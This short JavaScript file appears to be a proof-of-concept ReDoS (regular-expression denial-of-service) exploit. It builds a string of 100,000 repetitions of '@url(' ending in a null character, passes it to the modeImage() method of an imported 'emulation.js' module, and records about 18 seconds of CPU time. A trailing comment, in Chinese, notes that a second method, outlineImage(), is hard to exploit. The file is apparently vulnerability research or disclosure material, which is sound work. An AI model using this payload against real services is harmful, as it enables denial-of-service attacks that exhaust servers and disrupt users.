import { s } from "./emulation.js";

//Attack String :""+"@url("*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "@url(";
}
str += "\u0000";

//1.modeImage()
var e = {
  image: str,
};
var obj = new s();
console.log(obj.modeImage(e));


// real    0m18.505s
// user    0m18.314s
// sys     0m0.020s


//2.outlineImage():难以实现